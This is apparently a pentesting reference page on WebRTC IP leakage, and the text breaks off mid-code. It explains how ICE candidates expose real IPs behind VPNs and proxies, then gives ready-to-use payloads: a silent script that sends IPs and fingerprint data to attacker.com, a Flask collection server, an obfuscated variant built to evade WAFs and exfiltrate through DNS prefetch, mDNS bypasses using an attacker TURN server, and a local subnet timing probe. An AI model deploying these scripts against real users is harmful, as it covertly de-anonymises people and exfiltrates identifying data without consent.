---
title: WebRTC Leakage
description: WebRTC IP Leakage attacks — payloads, exploitation techniques, fingerprinting, de-anonymization, real IP discovery behind VPNs/Proxies/Tor, and pentesting methodology.
navigation:
  icon: i-lucide-radio
  title: WebRTC Leakage
---

## What is WebRTC Leakage?

**WebRTC (Web Real-Time Communication)** is a browser API that enables peer-to-peer audio, video, and data sharing directly between browsers. To establish these connections, WebRTC uses **STUN/TURN servers** to discover the user's IP addresses — including **local/private IPs** and **public IPs**. This IP discovery process happens **outside the normal HTTP request flow**, meaning it **bypasses VPNs, proxy servers, SOCKS tunnels, and even Tor** in many configurations.

::callout
---
icon: i-lucide-skull
color: red
---
WebRTC leakage is **devastating for privacy** because it reveals a user's **real IP address** even when they believe they are anonymous behind a VPN or proxy. A single JavaScript snippet on any webpage can silently extract this information without any user interaction or permission prompt.
::

::card-group
  ::card
  ---
  title: STUN Binding Request
  icon: i-lucide-globe
  ---
  WebRTC sends UDP packets to STUN servers to discover the user's public-facing IP address. This request bypasses HTTP proxy settings entirely.
  ::

  ::card
  ---
  title: ICE Candidate Harvesting
  icon: i-lucide-snowflake
  ---
  The Interactive Connectivity Establishment (ICE) framework gathers all possible network paths — revealing local IPs, VPN tunnel IPs, and real public IPs.
  ::

  ::card
  ---
  title: mDNS Obfuscation Bypass
  icon: i-lucide-eye-off
  ---
  Modern browsers replaced local IPs with mDNS hostnames (`.local`), but multiple techniques exist to bypass this protection and recover real local IPs.
  ::

  ::card
  ---
  title: Fingerprinting via WebRTC
  icon: i-lucide-fingerprint
  ---
  Beyond IP leakage, WebRTC exposes media device IDs, codec support, DTLS fingerprints, and network topology — creating a unique browser fingerprint.
  ::
::

---

## How WebRTC Leakage Works

::steps{level="4"}

#### Step 1 — JavaScript Creates an RTCPeerConnection

Attacker's webpage creates a WebRTC peer connection object. This requires **zero user permissions** — no camera, no microphone access needed.

#### Step 2 — ICE Candidate Gathering Begins

The browser automatically begins discovering network paths by contacting STUN servers via **UDP** and enumerating local network interfaces.

#### Step 3 — IP Addresses Exposed via ICE Candidates

Each discovered network path generates an **ICE candidate** containing IP addresses — local (private), reflexive (public NAT), and relay (TURN) addresses.

#### Step 4 — JavaScript Reads the Candidates

The `onicecandidate` event fires for each discovered path. The attacker's JavaScript reads the candidate strings, extracts all IP addresses, and exfiltrates them.

::

::note
The critical issue is that **STUN requests use UDP** and are sent **directly from the browser's network stack**, not through the browser's configured HTTP proxy or VPN's tunnel interface (in split-tunnel configurations).
::

---

## WebRTC Architecture & ICE Framework

### Connection Establishment Flow

```text [webrtc-architecture.txt]
┌──────────────────────────────────────────────────────────────────┐
│                    WebRTC Connection Flow                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐         ┌─────────────┐         ┌──────────┐     │
│  │  Browser  │────────▶│ STUN Server │◀────────│  Browser  │     │
│  │ (Caller)  │  UDP    │ (Google/    │  UDP    │ (Callee)  │     │
│  │           │         │  Public)    │         │           │     │
│  └─────┬────┘         └─────────────┘         └─────┬────┘     │
│        │                                              │          │
│        │  ICE Candidates:                             │          │
│        │  ├── Host:  192.168.1.100:54321             │          │
│        │  ├── Srflx: 203.0.113.50:12345 (REAL IP!)  │          │
│        │  └── Relay: 198.51.100.1:6000               │          │
│        │                                              │          │
│        │         ┌─────────────────┐                  │          │
│        └────────▶│ Signaling Server│◀─────────────────┘          │
│                  │ (Exchange SDP/  │                              │
│                  │  ICE Candidates)│                              │
│                  └─────────────────┘                              │
│                                                                  │
│  THE ATTACK:                                                     │
│  Attacker doesn't need a real peer connection.                   │
│  Just creating the RTCPeerConnection and listening               │
│  for ICE candidates reveals ALL IP addresses.                    │
│  No actual call is ever established.                             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### ICE Candidate Types

| Type | Name | Description | IP Exposed |
|------|------|-------------|-----------|
| `host` | Host Candidate | Local/private network interface IP | `192.168.x.x`, `10.x.x.x`, `fd00::x` |
| `srflx` | Server Reflexive | Public IP as seen by STUN server | Real public IP (bypasses VPN!) |
| `prflx` | Peer Reflexive | IP discovered during connectivity checks | NAT-mapped public IP |
| `relay` | Relay Candidate | IP of the TURN relay server | TURN server IP (less useful) |

### ICE Candidate String Format

```text [ice-candidate-format.txt]
CANDIDATE STRING ANATOMY:
═════════════════════════

candidate:842163049 1 udp 1677729535 192.168.1.100 54321 typ host generation 0
│                  │ │   │            │             │     │        │
│                  │ │   │            │             │     │        └─ Generation
│                  │ │   │            │             │     └── Candidate Type
│                  │ │   │            │             └── Port
│                  │ │   │            └── IP Address ◄── THIS IS WHAT WE WANT
│                  │ │   └── Priority
│                  │ └── Protocol (udp/tcp)
│                  └── Component ID (1=RTP, 2=RTCP)
└── Foundation

EXAMPLE CANDIDATES FROM A VPN USER:
────────────────────────────────────
host:  candidate:1 1 udp 2122194687 192.168.1.105 50000 typ host
       ↑ Local LAN IP behind router

host:  candidate:2 1 udp 2122131711 10.8.0.2 50001 typ host
       ↑ VPN tunnel interface IP (OpenVPN)

srflx: candidate:3 1 udp 1685987071 203.0.113.50 12345 typ srflx raddr 192.168.1.105 rport 50000
       ↑ REAL PUBLIC IP — NOT THE VPN IP!
       
       The STUN server sees the IP where the UDP packet
       actually came from — if VPN doesn't tunnel UDP,
       this is the ISP-assigned real IP address.
```

---

## VPN/Proxy Bypass Explained

::caution
Most users assume their VPN hides their IP from all web traffic. WebRTC **shatters this assumption** by using UDP channels that many VPN configurations don't capture.
::

::tabs
  :::tabs-item{icon="i-lucide-info" label="Why VPNs Fail"}
  ```text [vpn-bypass-explained.txt]
  WHY WebRTC BYPASSES VPNs:
  ═════════════════════════
  
  HTTP/HTTPS Traffic (what VPN protects):
  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
  │ Browser  │────▶│ VPN Tunnel│────▶│VPN Server│────▶│  Website │
  │          │     │ (encrypt) │     │(exit node)│     │          │
  └──────────┘     └──────────┘     └──────────┘     └──────────┘
  Website sees: VPN server IP ✓ (Protected)
  
  WebRTC STUN (what leaks):
  ┌──────────┐     ┌──────────────┐     ┌──────────┐
  │ Browser  │────▶│ UDP Directly │────▶│STUN Server│
  │          │     │ (NO VPN!)    │     │ (Google)  │
  └──────────┘     └──────────────┘     └──────────┘
  STUN sees: REAL IP ✗ (LEAKED!)
  
  WHY THIS HAPPENS:
  ─────────────────
  1. SPLIT TUNNELING: VPN only tunnels TCP traffic
     → UDP STUN requests go through normal interface
  
  2. BROWSER API LEVEL: WebRTC operates at OS socket level
     → Bypasses browser proxy settings
     → Bypasses PAC files and proxy extensions
  
  3. DNS vs DIRECT: STUN uses direct IP (not DNS)
     → VPN DNS leak protection doesn't help
  
  4. MULTIPLE INTERFACES: Browser enumerates ALL interfaces
     → VPN interface (tun0): 10.8.0.2
     → Real interface (eth0): 192.168.1.100
     → Both are reported as host candidates
  
  AFFECTED VPN TYPES:
  ├── Browser-based VPN extensions (ALWAYS leak)
  ├── Split-tunnel VPN configurations (USUALLY leak)
  ├── SOCKS proxies (ALWAYS leak — not a VPN)
  ├── HTTP proxies (ALWAYS leak)
  ├── Full-tunnel VPN without UDP routing (SOMETIMES leak)
  └── Full-tunnel VPN with proper firewall (Protected)
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Proxy Types vs WebRTC"}
  ```text [proxy-types-webrtc.txt]
  ANONYMITY TOOLS vs WebRTC LEAKAGE:
  ═══════════════════════════════════
  
  ┌─────────────────────┬──────────┬───────────┬──────────────┐
  │ Tool                │ HTTP     │ WebRTC    │ Real IP      │
  │                     │ Traffic  │ UDP STUN  │ Leaked?      │
  ├─────────────────────┼──────────┼───────────┼──────────────┤
  │ HTTP Proxy          │ Proxied  │ Direct    │ YES ✗        │
  │ SOCKS4 Proxy        │ Proxied  │ Direct    │ YES ✗        │
  │ SOCKS5 Proxy        │ Proxied  │ Direct    │ YES ✗        │
  │ Browser VPN Ext.    │ Proxied  │ Direct    │ YES ✗        │
  │ Tor Browser         │ Proxied  │ DISABLED  │ NO ✓         │
  │ Split-Tunnel VPN    │ Tunneled │ Direct    │ YES ✗        │
  │ Full-Tunnel VPN     │ Tunneled │ Tunneled* │ MAYBE ⚠      │
  │ VPN + Kill Switch   │ Tunneled │ Blocked   │ NO ✓         │
  │ VPN + Firewall      │ Tunneled │ Blocked   │ NO ✓         │
  │ Whonix/Tails        │ Tor'd    │ DISABLED  │ NO ✓         │
  └─────────────────────┴──────────┴───────────┴──────────────┘
  
  * Full-tunnel VPN may still leak local/private IPs
    even if public IP is protected
  ```
  :::
::

---

## Payloads & Techniques

### Basic — Vanilla JavaScript IP Extraction

The simplest and most reliable WebRTC leak payload. Works on all browsers with WebRTC enabled.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Basic IP Leak Payload"}
  ```html [basic-webrtc-leak.html]
  <!DOCTYPE html>
  <html>
  <head><title>WebRTC IP Leak</title></head>
  <body>
  <h2>Discovered IP Addresses:</h2>
  <ul id="ip-list"></ul>

  <script>
  // WebRTC IP Leak — Basic Payload
  // No permissions required. No user interaction needed.

  function extractIPs() {
    const ips = new Set();
    const ipList = document.getElementById('ip-list');
    
    // Create RTCPeerConnection with public STUN servers
    const rtc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:stun2.l.google.com:19302' },
        { urls: 'stun:stun3.l.google.com:19302' },
        { urls: 'stun:stun4.l.google.com:19302' }
      ]
    });

    // Listen for ICE candidates
    rtc.onicecandidate = function(event) {
      if (!event.candidate) return;
      
      // Extract IP from candidate string
      const candidate = event.candidate.candidate;
      const ipRegex = /(\d{1,3}\.){3}\d{1,3}|([a-f0-9]{1,4}:){7}[a-f0-9]{1,4}/gi;
      const matches = candidate.match(ipRegex);
      
      if (matches) {
        matches.forEach(function(ip) {
          if (!ips.has(ip)) {
            ips.add(ip);
            console.log('[+] IP Found:', ip);
            console.log('    Candidate:', candidate);
            
            const li = document.createElement('li');
            li.textContent = ip + ' (' + getIPType(candidate) + ')';
            ipList.appendChild(li);
          }
        });
      }
    };

    // Create data channel to trigger ICE gathering
    rtc.createDataChannel('leak');
    
    // Create offer to start the process
    rtc.createOffer().then(function(offer) {
      rtc.setLocalDescription(offer);
    });
    
    // Also parse the SDP for IPs
    setTimeout(function() {
      if (rtc.localDescription) {
        const sdp = rtc.localDescription.sdp;
        const sdpMatches = sdp.match(/(\d{1,3}\.){3}\d{1,3}/gi);
        if (sdpMatches) {
          sdpMatches.forEach(function(ip) {
            if (!ips.has(ip) && ip !== '0.0.0.0') {
              ips.add(ip);
              console.log('[+] SDP IP:', ip);
            }
          });
        }
      }
    }, 3000);
  }

  function getIPType(candidate) {
    if (candidate.includes('typ host')) return 'Local/Private';
    if (candidate.includes('typ srflx')) return 'Public/Real';
    if (candidate.includes('typ prflx')) return 'Peer Reflexive';
    if (candidate.includes('typ relay')) return 'TURN Relay';
    return 'Unknown';
  }

  extractIPs();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="How It Works"}
  ```text [basic-payload-explanation.txt]
  EXECUTION FLOW:
  ═══════════════
  
  1. new RTCPeerConnection({iceServers: [STUN servers]})
     → Browser creates WebRTC connection object
     → No permission prompt appears
  
  2. rtc.createDataChannel('leak')
     → Creates a data channel (triggers ICE gathering)
     → Still no permission required
  
  3. rtc.createOffer() → setLocalDescription()
     → Browser begins ICE candidate gathering
     → Sends UDP STUN binding requests to Google's servers
     → Enumerates ALL local network interfaces
  
  4. onicecandidate fires for each discovered path:
     → Host candidate: 192.168.1.100 (local IP)
     → Host candidate: 10.8.0.2 (VPN tunnel IP)
     → Srflx candidate: 203.0.113.50 (REAL public IP)
  
  5. JavaScript reads candidate strings
     → Regex extracts IP addresses
     → Attacker has victim's real IP
  
  TOTAL TIME: ~2-5 seconds
  USER INTERACTION: NONE
  PERMISSIONS REQUIRED: NONE
  ```
  :::
::

### Advanced — Silent Exfiltration Payload

::tabs
  :::tabs-item{icon="i-lucide-code" label="Silent Exfiltration"}
  ```javascript [silent-exfiltration.js]
  // Silent WebRTC IP Exfiltration
  // Zero UI — runs invisibly on any webpage
  // Sends discovered IPs to attacker's server

  (function() {
    'use strict';
    
    const EXFIL_URL = 'https://attacker.com/collect';
    const collected = {
      timestamp: new Date().toISOString(),
      page_url: window.location.href,
      referrer: document.referrer,
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: screen.width + 'x' + screen.height,
      ips: {
        local: [],
        public: [],
        vpn: [],
        ipv6: [],
        all_candidates: []
      }
    };

    const seen = new Set();

    function classifyIP(ip) {
      // IPv6
      if (ip.includes(':')) return 'ipv6';
      
      const parts = ip.split('.').map(Number);
      
      // Private ranges
      if (parts[0] === 10) return 'local';
      if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return 'local';
      if (parts[0] === 192 && parts[1] === 168) return 'local';
      if (parts[0] === 169 && parts[1] === 254) return 'local'; // Link-local
      if (parts[0] === 127) return 'local'; // Loopback
      
      // Common VPN ranges
      if (parts[0] === 10 && parts[1] === 8) return 'vpn'; // OpenVPN default
      if (parts[0] === 10 && parts[1] === 0) return 'vpn'; // WireGuard common
      if (parts[0] === 172 && parts[1] === 16) return 'vpn'; // VPN common
      
      return 'public';
    }

    function extractFromCandidate(candidateStr) {
      if (!candidateStr) return;
      
      collected.ips.all_candidates.push(candidateStr);
      
      // IPv4
      const ipv4Regex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
      let match;
      while ((match = ipv4Regex.exec(candidateStr)) !== null) {
        const ip = match[1];
        if (ip === '0.0.0.0') continue;
        if (seen.has(ip)) continue;
        seen.add(ip);
        
        const type = classifyIP(ip);
        collected.ips[type].push(ip);
      }
      
      // IPv6
      const ipv6Regex = /([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/gi;
      while ((match = ipv6Regex.exec(candidateStr)) !== null) {
        const ip = match[1];
        if (seen.has(ip)) continue;
        seen.add(ip);
        collected.ips.ipv6.push(ip);
      }
    }

    function exfiltrate() {
      // Method 1: sendBeacon (most reliable, works on page unload)
      if (navigator.sendBeacon) {
        navigator.sendBeacon(EXFIL_URL, JSON.stringify(collected));
      }
      
      // Method 2: Image pixel (bypasses CORS)
      const img = new Image();
      img.src = EXFIL_URL + '?d=' + 
        encodeURIComponent(btoa(JSON.stringify(collected)));
      
      // Method 3: Fetch with no-cors
      fetch(EXFIL_URL, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(collected)
      }).catch(function() {});
    }

    // Multiple STUN servers for reliability
    const stunServers = [
      'stun:stun.l.google.com:19302',
      'stun:stun1.l.google.com:19302',
      'stun:stun2.l.google.com:19302',
      'stun:stun.services.mozilla.com',
      'stun:stun.stunprotocol.org:3478',
      'stun:stun.voip.eutelia.it:3478',
      'stun:stun.sipnet.net:3478'
    ];

    try {
      const pc = new (window.RTCPeerConnection || 
                       window.mozRTCPeerConnection || 
                       window.webkitRTCPeerConnection)(
        { iceServers: [{ urls: stunServers }] }
      );

      pc.onicecandidate = function(e) {
        if (e.candidate) {
          extractFromCandidate(e.candidate.candidate);
        } else {
          // ICE gathering complete — exfiltrate all collected data
          exfiltrate();
        }
      };

      // Also extract from SDP
      pc.createDataChannel('');
      pc.createOffer().then(function(offer) {
        extractFromCandidate(offer.sdp);
        pc.setLocalDescription(offer);
      });

      // Fallback exfiltration after timeout
      setTimeout(exfiltrate, 8000);
      
    } catch(e) {
      // WebRTC not available — still collect other fingerprint data
      collected.ips.error = 'WebRTC unavailable: ' + e.message;
      exfiltrate();
    }
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Attacker's Collection Server"}
  ```python [collection-server.py]
  #!/usr/bin/env python3
  """
  WebRTC IP Leak Collection Server
  Receives and logs exfiltrated IP data
  """

  from flask import Flask, request, jsonify
  from flask_cors import CORS
  from datetime import datetime
  import json
  import base64

  app = Flask(__name__)
  CORS(app)  # Allow cross-origin requests

  LOG_FILE = 'collected_ips.jsonl'

  @app.route('/collect', methods=['GET', 'POST', 'OPTIONS'])
  def collect():
      data = None
      
      if request.method == 'POST':
          try:
              data = request.get_json(force=True)
          except:
              data = {'raw_body': request.data.decode('utf-8', errors='ignore')}
      
      elif request.method == 'GET':
          encoded = request.args.get('d', '')
          if encoded:
              try:
                  data = json.loads(base64.b64decode(encoded))
              except:
                  data = {'encoded': encoded}
      
      if data:
          data['_server_time'] = datetime.now().isoformat()
          data['_source_ip'] = request.remote_addr
          data['_headers'] = dict(request.headers)
          
          # Log to file
          with open(LOG_FILE, 'a') as f:
              f.write(json.dumps(data) + '\n')
          
          # Print summary
          ips = data.get('ips', {})
          print(f"\n{'='*60}")
          print(f"[+] New WebRTC Leak Captured!")
          print(f"    Time: {data['_server_time']}")
          print(f"    HTTP Source IP: {data['_source_ip']}")
          print(f"    Local IPs:  {ips.get('local', [])}")
          print(f"    Public IPs: {ips.get('public', [])}")
          print(f"    VPN IPs:    {ips.get('vpn', [])}")
          print(f"    IPv6:       {ips.get('ipv6', [])}")
          print(f"    Page: {data.get('page_url', 'N/A')}")
          print(f"    UA: {data.get('user_agent', 'N/A')}")
          print(f"{'='*60}")
      
      # Return 1x1 transparent pixel (for image beacon)
      pixel = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00' \
              b'\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21' \
              b'\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00' \
              b'\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44' \
              b'\x01\x00\x3b'
      
      return pixel, 200, {'Content-Type': 'image/gif'}

  if __name__ == '__main__':
      print("[*] WebRTC Leak Collection Server")
      print(f"[*] Logging to: {LOG_FILE}")
      app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
  ```
  :::
::

### Stealth — Obfuscated Payload

::code-collapse

```javascript [obfuscated-webrtc-leak.js]
// Obfuscated WebRTC Leak Payload
// Designed to bypass WAFs, content filters, and static analysis
// Uses indirect references and string construction

(function(){
  var _0x={
    a:'RTC',b:'Peer',c:'Connection',d:'ice',e:'candidate',
    f:'create',g:'Data',h:'Channel',i:'Offer',j:'setLocal',
    k:'Description',l:'onicecandidate',m:'stun:stun',
    n:'.l.google.com:19302',o:'candidate'
  };
  
  var W=window;
  var C=_0x.a+_0x.b+_0x.c;
  var PC=W[C]||W['webkit'+C]||W['moz'+C];
  
  if(!PC)return;
  
  var s=[_0x.m+_0x.n, _0x.m+'1'+_0x.n, _0x.m+'2'+_0x.n];
  var p=new PC({iceServers:[{urls:s}]});
  var r=/(\d{1,3}\.){3}\d{1,3}/g;
  var S=new Set();
  
  p[_0x.l]=function(e){
    if(!e[_0x.e])return;
    var c=e[_0x.e][_0x.o];
    var m=c.match(r);
    if(m)m.forEach(function(ip){
      if(S.has(ip)||ip==='0.0.0.0')return;
      S.add(ip);
      // Exfil via DNS prefetch (stealthy)
      var l=document.createElement('link');
      l.rel='dns-prefetch';
      l.href='//'+ip.replace(/\./g,'-')+'.leak.attacker.com';
      document.head.appendChild(l);
      // Exfil via image pixel
      new Image().src='https://attacker.com/p?i='+btoa(ip)+'&t='+Date.now();
    });
  };
  
  p[_0x.f+_0x.g+_0x.h]('');
  p[_0x.f+_0x.i]().then(function(o){
    p[_0x.j+_0x.k](o);
  });
})();
```

::

### IPv6 Leak Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="IPv6 Extraction Payload"}
  ```javascript [ipv6-leak.js]
  // IPv6 WebRTC Leak Payload
  // IPv6 addresses are often MORE identifying than IPv4
  // because they may contain the device's MAC address (EUI-64)

  function extractIPv6() {
    const results = {
      ipv4: [],
      ipv6: [],
      ipv6_info: []
    };

    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun.stunprotocol.org:3478' }
      ]
    });

    pc.onicecandidate = function(event) {
      if (!event.candidate) {
        console.log('\n=== RESULTS ===');
        console.log('IPv4:', results.ipv4);
        console.log('IPv6:', results.ipv6);
        results.ipv6_info.forEach(i => console.log('IPv6 Analysis:', i));
        return;
      }

      const candidate = event.candidate.candidate;
      
      // IPv4 extraction
      const ipv4Match = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      if (ipv4Match && ipv4Match[1] !== '0.0.0.0') {
        if (!results.ipv4.includes(ipv4Match[1])) {
          results.ipv4.push(ipv4Match[1]);
        }
      }

      // IPv6 extraction (multiple formats)
      const ipv6Patterns = [
        // Full IPv6
        /([0-9a-f]{1,4}:){7}[0-9a-f]{1,4}/gi,
        // Compressed IPv6
        /([0-9a-f]{1,4}:){1,7}:/gi,
        /::([0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4}/gi,
        // IPv4-mapped IPv6
        /::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/gi,
        // Link-local
        /fe80:[0-9a-f:]+/gi
      ];

      ipv6Patterns.forEach(function(pattern) {
        const matches = candidate.match(pattern);
        if (matches) {
          matches.forEach(function(ipv6) {
            if (!results.ipv6.includes(ipv6)) {
              results.ipv6.push(ipv6);
              
              // Analyze IPv6 for MAC address (EUI-64)
              const info = analyzeIPv6(ipv6);
              if (info) results.ipv6_info.push(info);
            }
          });
        }
      });
    };

    pc.createDataChannel('ipv6leak');
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
  }

  function analyzeIPv6(ipv6) {
    // Check if IPv6 contains EUI-64 (MAC-derived interface ID)
    // EUI-64 has ff:fe in the middle of the interface identifier
    const parts = ipv6.split(':');
    if (parts.length >= 4) {
      const lastFour = parts.slice(-4).join(':');
      if (lastFour.includes('ff:fe') || lastFour.includes('fffe')) {
        // Extract MAC address from EUI-64
        // Interface ID: xxxx:xxff:fexx:xxxx
        // MAC: xx:xx:xx:xx:xx:xx (flip bit 7 of first byte)
        return {
          ipv6: ipv6,
          type: 'EUI-64 (MAC-derived)',
          note: 'Contains device MAC address — highly identifying!',
          interface_id: lastFour
        };
      }
    }
    
    if (ipv6.startsWith('fe80')) {
      return { ipv6: ipv6, type: 'Link-Local', note: 'Local network scope' };
    }
    if (ipv6.startsWith('fd') || ipv6.startsWith('fc')) {
      return { ipv6: ipv6, type: 'Unique Local (ULA)', note: 'Private IPv6' };
    }
    
    return { ipv6: ipv6, type: 'Global Unicast', note: 'Publicly routable' };
  }

  extractIPv6();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Why IPv6 Leaks Are Dangerous"}
  ```text [ipv6-danger.txt]
  IPv6 LEAK SEVERITY:
  ═══════════════════
  
  1. GLOBALLY UNIQUE ADDRESS
     Unlike IPv4 (shared via NAT), IPv6 addresses are often
     unique per device → directly identifies the device
  
  2. MAC ADDRESS EXPOSURE (EUI-64)
     Some IPv6 addresses embed the device's MAC address:
     
     MAC:  00:1A:2B:3C:4D:5E
     IPv6: 2001:db8::021a:2bff:fe3c:4d5e
                     ^^^^    ^^^^  ^^^^
                     MAC     ff:fe MAC
     
     → Attacker recovers physical device MAC address
     → MAC identifies device manufacturer (OUI lookup)
     → MAC is persistent across networks
  
  3. ISP ASSIGNMENT TRACKING
     IPv6 prefix identifies the ISP and often the
     geographic region more precisely than IPv4
  
  4. STABLE ACROSS REBOOTS
     Many systems use stable privacy addresses (RFC 7217)
     but these are still consistent per network
  
  5. VPN BYPASS IS WORSE
     Many VPNs only tunnel IPv4 traffic
     IPv6 traffic goes directly through real interface
     → Complete de-anonymization
  ```
  :::
::

### mDNS Bypass Techniques

Modern browsers (Chrome 74+, Firefox 70+) replaced local IP addresses in ICE candidates with mDNS hostnames (`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.local`). These techniques attempt to bypass this protection.

::tabs
  :::tabs-item{icon="i-lucide-code" label="mDNS Bypass — TURN Server"}
  ```javascript [mdns-bypass-turn.js]
  // Bypass mDNS by using a TURN server controlled by the attacker
  // TURN server sees the real IP when the client connects

  const pc = new RTCPeerConnection({
    iceServers: [{
      urls: 'turn:attacker-turn-server.com:3478',
      username: 'leak',
      credential: 'leak123'
    }],
    // Force relay candidates only
    iceTransportPolicy: 'relay'
  });

  pc.onicecandidate = function(event) {
    if (!event.candidate) return;
    
    // The relay candidate reveals the TURN server IP,
    // but the TURN server LOG reveals the client's real IP
    console.log('Relay candidate:', event.candidate.candidate);
    
    // The real IP is captured server-side on the TURN server
    // Check TURN server logs for ALLOCATION requests
  };

  pc.createDataChannel('mdns-bypass');
  pc.createOffer().then(offer => pc.setLocalDescription(offer));

  /*
   * On attacker's TURN server (coturn), the allocation log shows:
   * 
   * session 001: realm=attacker.com, username=leak
   * session 001: peer address: 203.0.113.50:54321  ← REAL IP!
   * 
   * The TURN server receives direct UDP from the client,
   * so it always sees the real source IP.
   */
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="mDNS Bypass — SDP Parsing"}
  ```javascript [mdns-bypass-sdp.js]
  // Some browsers leak IPs in SDP even with mDNS enabled
  // Parse the SDP offer directly instead of waiting for candidates

  const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
  });

  pc.createDataChannel('sdp-leak');

  pc.createOffer().then(function(offer) {
    // Parse SDP for IP addresses BEFORE setting local description
    const sdp = offer.sdp;
    console.log('Raw SDP:\n', sdp);
    
    // Look for c= line (connection info)
    const cLine = sdp.match(/c=IN IP[46] (\S+)/g);
    if (cLine) {
      console.log('[+] SDP Connection IPs:', cLine);
    }
    
    // Look for a=candidate lines in SDP
    const candidates = sdp.match(/a=candidate:.+/g);
    if (candidates) {
      candidates.forEach(function(c) {
        const ipMatch = c.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        if (ipMatch && ipMatch[1] !== '0.0.0.0') {
          console.log('[+] SDP Candidate IP:', ipMatch[1]);
        }
      });
    }
    
    // Check for .local addresses (mDNS is active)
    if (sdp.includes('.local')) {
      console.log('[!] mDNS is active — local IPs are obfuscated');
      console.log('[!] Try TURN server bypass or older API methods');
    }
    
    pc.setLocalDescription(offer);
  });

  // Also check after ICE gathering is complete
  pc.onicegatheringstatechange = function() {
    if (pc.iceGatheringState === 'complete') {
      const sdp = pc.localDescription.sdp;
      console.log('\n[*] Final SDP after ICE gathering:');
      
      const allIPs = sdp.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
      if (allIPs) {
        const unique = [...new Set(allIPs)].filter(ip => ip !== '0.0.0.0');
        console.log('[+] All unique IPs in final SDP:', unique);
      }
    }
  };
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="mDNS Bypass — Timing Attack"}
  ```javascript [mdns-bypass-timing.js]
  // Timing-based technique to infer local network information
  // Even if exact IP is hidden by mDNS, timing reveals subnet info

  async function timingLeakSubnet() {
    const results = [];
    
    // Common private subnets to test
    const subnets = [
      '192.168.0', '192.168.1', '192.168.2', '192.168.10',
      '192.168.100', '10.0.0', '10.0.1', '10.1.0',
      '172.16.0', '172.16.1'
    ];
    
    for (const subnet of subnets) {
      const gateway = subnet + '.1';
      const start = performance.now();
      
      try {
        // Attempt connection to common gateway IPs
        // Timing difference reveals which subnet is local
        const img = new Image();
        img.src = 'http://' + gateway + ':1/' + Math.random();
        
        await new Promise((resolve) => {
          img.onerror = img.onload = function() {
            const elapsed = performance.now() - start;
            results.push({ subnet: subnet, gateway: gateway, time: elapsed });
            resolve();
          };
          // Timeout after 500ms
          setTimeout(resolve, 500);
        });
      } catch(e) {}
    }
    
    // Sort by response time — fastest is likely the local subnet
    results.sort((a, b) => a.time - b.time);
    
    console.log('[*] Subnet Timing Results:');
    results.forEach(r => {
      const likely = r.time < 50 ? '← LIKELY LOCAL' : '';
      console.log(`    ${r.subnet}.0/24 — ${r.time.toFixed(1)}ms ${likely}`);
    });
  }

  timingLeakSubnet();
  ```
  :::
::

### STUN Server Enumeration

::code-collapse

```javascript [stun-enumeration.js]
// Test multiple STUN servers to maximize IP discovery
// Different STUN servers may see different source IPs
// (e.g., if the target has multiple internet connections)

const STUN_SERVERS = [
  // Google
  'stun:stun.l.google.com:19302',
  'stun:stun1.l.google.com:19302',
  'stun:stun2.l.google.com:19302',
  'stun:stun3.l.google.com:19302',
  'stun:stun4.l.google.com:19302',
  
  // Mozilla
  'stun:stun.services.mozilla.com:3478',
  
  // Twilio
  'stun:global.stun.twilio.com:3478',
  
  // Public STUN servers
  'stun:stun.stunprotocol.org:3478',
  'stun:stun.voip.eutelia.it:3478',
  'stun:stun.sipnet.net:3478',
  'stun:stun.ekiga.net:3478',
  'stun:stun.schlund.de:3478',
  'stun:stun.voipbuster.com:3478',
  'stun:stun.voipstunt.com:3478',
  'stun:stun.counterpath.net:3478',
  'stun:stun.1und1.de:3478',
  'stun:stun.gmx.net:3478',
  'stun:stun.callwithus.com:3478',
  'stun:stun.internetcalls.com:3478',
  'stun:numb.viagenie.ca:3478'
];

async function testSTUNServer(stunUrl) {
  return new Promise((resolve) => {
    const ips = new Set();
    const timeout = setTimeout(() => resolve({ server: stunUrl, ips: [...ips] }), 5000);
    
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: stunUrl }]
      });
      
      pc.onicecandidate = function(e) {
        if (!e.candidate) {
          clearTimeout(timeout);
          pc.close();
          resolve({ server: stunUrl, ips: [...ips] });
          return;
        }
        
        const matches = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
        if (matches) matches.forEach(ip => {
          if (ip !== '0.0.0.0') ips.add(ip);
        });
      };
      
      pc.createDataChannel('');
